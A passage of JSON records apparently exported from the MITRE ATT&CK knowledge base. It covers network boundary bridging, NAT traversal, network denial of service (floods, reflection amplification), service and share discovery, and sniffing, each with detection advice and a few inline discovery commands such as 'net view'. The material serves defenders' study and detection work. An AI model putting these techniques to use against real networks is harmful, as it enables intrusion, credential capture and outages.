Tiger Linux),(Citation: Cisco CaddyWiper March 2022),(Citation: Microsoft Actinium February 2022),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: NTT Security Flagpro new December 2021),(Citation: Qualys Hermetic Wiper March 2022),(Citation: Profero APT27 December 2020),(Citation: Palo Alto Brute Ratel July 2022),(Citation: ESET Gamaredon June 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: Cybereason Conti Jan 2021),(Citation: Talos Bisonal Mar 2020),(Citation: Checkpoint Dridex Jan 2021),(Citation: Group IB GrimAgent July 2021),(Citation: Lastline PlugX Analysis),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: CrowdStrike Ryuk January 2019),(Citation: ESET PipeMon May 2020),(Citation: Securelist APT10 March 2021),(Citation: ESET Bad Rabbit),(Citation: TrendMicro BlackTech June 2017),(Citation: FireEye HAWKBALL Jun 2019),(Citation: FOX-IT May 2016 Mofang),(Citation: McAfee Honeybee),(Citation: Check Point APT34 April 2021),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Medium Babuk February 2021),(Citation: Forcepoint Monsoon),(Citation: FireEye NETWIRE March 2019),(Citation: Unit42 BendyBear Feb 2021),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: RecordedFuture WhisperGate Jan 2022),(Citation: Malwarebytes Saint Bot April 2021),(Citation: GitHub Bloodhound),(Citation: Bitdefender Naikon April 2021),(Citation: Minerva Labs Black Basta May 2022),(Citation: Malwarebytes AvosLocker Jul 2021),(Citation: Trend Micro Tick November 2019),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: CarbonBlack Conti July 2020),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Hornet Security Avaddon June 2020),(Citation: Lazarus APT January 2022),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: McAfee Babuk February 2021),(Citation: ESET Gelsemium June 2021),(Citation: Eset Ramsay May 2020),(Citation: Bitdefender APT28 Dec 2015),(Citation: Talos TinyTurla September 2021),(Citation: US-CERT HOTCROISSANT February 2020),(Citation: FireEye Ursnif Nov 2017),(Citation: Qualys LolZarus),(Citation: ESET Dukes October 2019),(Citation: TrendMicro Netwalker May 2020),(Citation: CheckPoint Naikon May 2020),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Intel 471 REvil March 2020),(Citation: Fortinet Diavol July 2021),(Citation: Malwarebytes Konni Aug 2021),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: McAfee Sharpshooter December 2018),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Proofpoint TA416 Europe March 2022),(Citation: McAfee Cuba April 2021),(Citation: TrendMicro Taidoor),(Citation: Cybereason Chaes Nov 2020),(Citation: ATT QakBot April 2021),(Citation: Mcafee Clop Aug 2019),(Citation: Trend Micro Waterbear December 2019),(Citation: FireEye Hancitor),(Citation: Kaspersky Lyceum October 2021),(Citation: Medium Eli Salem GuLoader April 2021),(Citation: ASERT InnaputRAT April 2018),(Citation: Talos Group123),(Citation: CheckPoint Bandook Nov 2020),(Citation: Joe Sec Trickbot),(Citation: ESET Attor Oct 2019),(Citation: objective-see windtail2 jan 2019),(Citation: Unit 42 Siloscape Jun 2021),(Citation: IBM MegaCortex),(Citation: Cylance Dust Storm),(Citation: Avertium Black Basta June 2022),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Trend Micro KillDisk 1),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: ESET Hermetic Wizard March 2022),(Citation: SentinelLabs Metador Sept 2022),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Turla PowerShell May 2019),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Novetta Winnti April 2015),(Citation: Donut Github),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Cyble Black Basta May 2022),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Medium Metamorfo Apr 2020),(Citation: Check Point Black Basta October 2022),(Citation: ESET LightNeuron May 2019),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: NCC Group WastedLocker June 2020),(Citation: ESET InvisiMole June 2020),(Citation: Symantec Cicada November 2020),(Citation: MDSec Brute Ratel August 2022),(Citation: McAfee Bankshot),(Citation: McAfee Maze March 2020),(Citation: Cyble Egregor Oct 2020),(Citation: IronNet BlackTech Oct 2021),(Citation: Cybereason Royal December 2022),(Citation: Trustwave GoldenSpy June 2020),(Citation: Malwarebytes Pony April 2016),(Citation: FireEye FIN7 Oct 2019),(Citation: Cybereason Bazar July 2020),(Citation: HP SVCReady Jun 2022),(Citation: BlackBerry CostaRicto November 2020),(Citation: BiZone Lizar May 2021),(Citation: ClearSky Lazarus Aug 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Gh0stRAT ATT March 2019),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Mandiant APT41),(Citation: Talos Lokibot Jan 2021),(Citation: Objective-See MacMa Nov 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: Zscaler Higaisa 2020),(Citation: Unit 42 BackConfig May 2020),(Citation: ESET ComRAT May 2020),(Citation: ESET RTM Feb 2017),(Citation: MSTIC FoggyWeb September 2021),(Citation: Cybereason Clop Dec 2020),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Accenture HyperStack October 2020),(Citation: ESET DazzleSpy Jan 2022),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Kaspersky Lab SynAck May 2018),(Citation: Fortinet Metamorfo Feb 2020),(Citation: cobaltstrike manual),(Citation: Check Point Meteor Aug 2021),(Citation: Trend Micro njRAT 2018),(Citation: Crowdstrike Indrik November 2018),(Citation: Cycraft Chimera April 2020),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: NSA MS AppLocker),(Citation: TechNet Applocker vs SRP),(Citation: Corio 2008),(Citation: Microsoft Windows Defender Application Control),(Citation: win10_asr)"}
{"ID":"T1599","name":"Network Boundary Bridging","description":"Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\n\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.","url":"https://attack.mitre.org/techniques/T1599","created":"19 October 2020","last modified":"05 May 2022","version":"1.1","tactics":"Defense Evasion","detection":"Consider monitoring network traffic on both interfaces of border network devices with out-of-band packet capture or network flow data, using a different device than the one in question.  Look for traffic that should be prohibited by the intended network traffic policy enforcement for the border network device.\n\nMonitor the border network device’s configuration to validate that the policy enforcement sections are what was intended.  Look for rules that are less restrictive, or that allow specific traffic types that were not previously authorized.","platforms":"Network","data sources":"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Firewall, System Access Controls","contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Cisco IOS Software Integrity Assurance - AAA),(Citation: NIST 800-63-3),(Citation: Cisco IOS Software Integrity Assurance - TACACS)"}
{"ID":"T1599.001","name":"Network Boundary Bridging: Network Address Translation Traversal","description":"Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nNetwork devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.(Citation: RFC1918)\n\nWhen an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  \n\nAdversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities","url":"https://attack.mitre.org/techniques/T1599/001","created":"19 October 2020","last modified":"21 October 2020","version":"1.0","tactics":"Defense Evasion","detection":"Consider monitoring network traffic on both interfaces of border network devices.  Compare packets transmitted by the device between networks to look for signs of NAT being implemented.  Packets which have their IP addresses changed should still have the same size and contents in the data encapsulated beyond Layer 3.  In some cases, Port Address Translation (PAT) may also be used by an adversary.\n\nMonitor the border network device’s configuration to determine if any unintended NAT rules have been added without authorization.","platforms":"Network","data sources":"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1599","defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Cisco IOS Software Integrity Assurance - AAA),(Citation: NIST 800-63-3),(Citation: Cisco IOS Software Integrity Assurance - TACACS)"}
{"ID":"T1498","name":"Network Denial of Service","description":"Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).","url":"https://attack.mitre.org/techniques/T1498","created":"17 April 2019","last modified":"25 March 2022","version":"1.1","tactics":"Impact","detection":"Detection of Network DoS can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow(Citation: Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an Network DoS event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.","platforms":"Azure AD, Containers, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Network Traffic: Network Traffic Flow, Sensor Health: Host Status","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team","permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":"(Citation: US District Court Indictment GRU Oct 2018),(Citation: Unit 42 Lucifer June 2020),(Citation: CERT-EU DDoS March 2017)"}
{"ID":"T1498.001","name":"Network Denial of Service: Direct Network Flood","description":"Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)","url":"https://attack.mitre.org/techniques/T1498/001","created":"02 March 2020","last modified":"30 March 2023","version":"1.3","tactics":"Impact","detection":"Detection of a network flood can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow(Citation: Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect a network flood event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.","platforms":"Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Network Traffic: Network Traffic Flow, Sensor Health: Host Status","is sub-technique":true,"sub-technique of":"T1498","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":",(Citation: CERT-EU DDoS March 2017)"}
{"ID":"T1498.002","name":"Network Denial of Service: Reflection Amplification","description":"Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017) This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.\n\nReflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)","url":"https://attack.mitre.org/techniques/T1498/002","created":"02 March 2020","last modified":"30 March 2023","version":"1.3","tactics":"Impact","detection":"Detection of reflection amplification can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow(Citation: Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect a reflection amplification DoS event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.","platforms":"Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Network Traffic: Network Traffic Flow, Sensor Health: Host Status","is sub-technique":true,"sub-technique of":"T1498","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":",(Citation: CERT-EU DDoS March 2017)"}
{"ID":"T1046","name":"Network Service Discovery","description":"Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.(Citation: apple doco bonjour description)(Citation: macOS APT Activity Bradley)","url":"https://attack.mitre.org/techniques/T1046","created":"31 May 2017","last modified":"30 March 2023","version":"3.0","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.","platforms":"Containers, IaaS, Linux, Network, Windows, macOS","data sources":"Cloud Service: Cloud Service Enumeration, Command: Command Execution, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Praetorian","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: SecTools nbtscan June 2003),(Citation: NCC Group Chimera January 2021),(Citation: Palo Alto Black-T October 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Cisco Talos Intelligence Group),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: FoxIT Wocao December 2019),(Citation: ESET InvisiMole June 2020),(Citation: FireEye APT39 Jan 2019),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Symantec Leafminer July 2018),(Citation: Cybereason Royal December 2022),(Citation: Talos Rocke August 2018),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Antiy CERT Ramsay April 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: Unit42 Emissary Panda May 2019),(Citation: FireEye APT41 Aug 2019),(Citation: BlackBerry CostaRicto November 2020),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: ESET Industroyer),(Citation: CERT-FR PYSA April 2020),(Citation: Symantec Palmerworm Sep 2020),(Citation: Dell TG-3390),(Citation: Baumgartner Naikon 2015),(Citation: Bitdefender Naikon April 2021),(Citation: Cado Security TeamTNT Worm August 2020),(Citation: FireEye FIN6 April 2016),(Citation: Unit 42 Lucifer June 2020),(Citation: GitHub PoshC2),(Citation: Github PowerShell Empire),(Citation: Unit42 Xbash Sept 2018),(Citation: Securelist DarkVishnya Dec 2018),(Citation: ANSSI Sandworm January 2021),(Citation: Talos ZxShell Oct 2014),(Citation: Unit 42 Hildegard Malware),(Citation: Github Koadic),(Citation: Peirates GitHub),(Citation: Anomali Rocke March 2019),(Citation: Gigamon Berserk Bear October 2021),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Eset Ramsay May 2020),(Citation: BitDefender Chafer May 2020),(Citation: Group IB Cobalt Aug 2017),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: DFIR Phosphorus November 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: TrendMicro TropicTrooper 2015),(Citation: ClearSky Pay2Kitten December 2020),(Citation: cobaltstrike manual),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: FireEye Periscope March 2018),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Palo Alto Brute Ratel July 2022),(Citation: SANS Conficker),(Citation: ESET Hermetic Wizard March 2022),(Citation: Debian nbtscan Nov 2019),(Citation: Symantec Suckfly May 2016),(Citation: GitHub Pupy),(Citation: Cisco Talos Avos Jun 2022),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Invincea XTunnel),"}
{"ID":"T1135","name":"Network Share Discovery","description":"Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.","url":"https://attack.mitre.org/techniques/T1135","created":"14 December 2017","last modified":"30 March 2023","version":"3.1","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Praetorian","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCC Group Team9 June 2020),(Citation: Fortinet Diavol July 2021),(Citation: NCC Group Chimera January 2021),(Citation: Mandiant APT1),(Citation: Symantec Orangeworm April 2018),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Symantec Buckeye),(Citation: Trend Micro DRBControl February 2020),(Citation: Symantec Sowbug Nov 2017),(Citation: ESET Bad Rabbit),(Citation: FoxIT Wocao December 2019),(Citation: FOX-IT May 2016 Mofang),(Citation: McAfee Cuba April 2021),(Citation: Kaspersky QakBot September 2021),(Citation: Cybereason Royal December 2022),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: ESET InvisiMole June 2018),(Citation: DFIR Conti Bazar Nov 2021),(Citation: US-CERT TA18-074A),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: Mcafee Clop Aug 2019),(Citation: Antiy CERT Ramsay April 2020),(Citation: FireEye APT41 Aug 2019),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: CME Github September 2018),(Citation: CIRCL PlugX March 2013),(Citation: Microsoft BlackCat Jun 2022),(Citation: Malwarebytes AvosLocker Jul 2021),(Citation: ESET Trickbot Oct 2020),(Citation: CarbonBlack Conti July 2020),(Citation: Github PowerShell Empire),(Citation: Securelist DarkVishnya Dec 2018),(Citation: TrendMicro Tonto Team October 2020),(Citation: Bitdefender Trickbot March 2020),(Citation: Arxiv Avaddon Feb 2021),(Citation: Github Koadic),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Savill 1999),(Citation: Eset Ramsay May 2020),(Citation: BitDefender Chafer May 2020),(Citation: Securelist Sofacy Feb 2018),(Citation: Joint CSA AvosLocker Mar 2022),(Citation: Microsoft Actinium February 2022),(Citation: Group IB APT 41 June 2021),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: TrendMicro TropicTrooper 2015),(Citation: Sophos BlackCat Jul 2022),(Citation: Talos Olympic Destroyer 2018),(Citation: FireEye Periscope March 2018),(Citation: Trend Micro Qakbot May 2020),(Citation: NTT Security Flagpro new December 2021),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: FireEye FiveHands April 2021),(Citation: NCC Group Fivehands June 2021),(Citation: GitHub Pupy),(Citation: Sentinel Labs WastedLocker July 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Windows Anonymous Enumeration of SAM Accounts)"}
{"ID":"T1040","name":"Network Sniffing","description":"Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)","url":"https://attack.mitre.org/techniques/T1040","created":"31 May 2017","last modified":"12 April 2023","version":"1.4","tactics":"Credential Access, Discovery","detection":"Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.\n\nIn cloud-based environments, monitor for the creation of new traffic mirrors or modification of existing traffic mirrors. For network infrastructure devices, collect AAA logging to monitor for the capture of network traffic.","platforms":"IaaS, Linux, Network, Windows, macOS","data sources":"Command: Command Execution, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Austin Clark, @c2defense; Oleg Kolesnikov, Securonix; Tiago Faria, 3CORESec","permissions required":null,"supports remote":null,"system requirements":"Network interface access and packet capture driver","impact type":null,"effective permissions":null,"relationship citations":"(Citation: FireEye APT28 Hospitality Aug 2017),(Citation: Trend Micro Banking Malware Jan 2019),(Citation: Kaspersky Turla Penquin December 2014),(Citation: ESET Telebots Dec 2016),(Citation: GitHub Responder),(Citation: Impacket Tools),(Citation: CISA AA20-301A Kimsuky),(Citation: Kaspersky Regin),(Citation: GitHub PoshC2),(Citation: Symantec Elfin Mar 2019),(Citation: Github PowerShell Empire),(Citation: Securelist DarkVishnya Dec 2018),(Citation: Leonardo Turla Penquin May 2020),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: MSTIC FoggyWeb September 2021),(Citation: FireEye MESSAGETAP October 2019),(Citation: US District Court Indictment GRU Oct 2018),(Citation: FireEye APT28),(Citation: Debian nbtscan Nov 2019),(Citation: SecTools nbtscan June 2003),"}
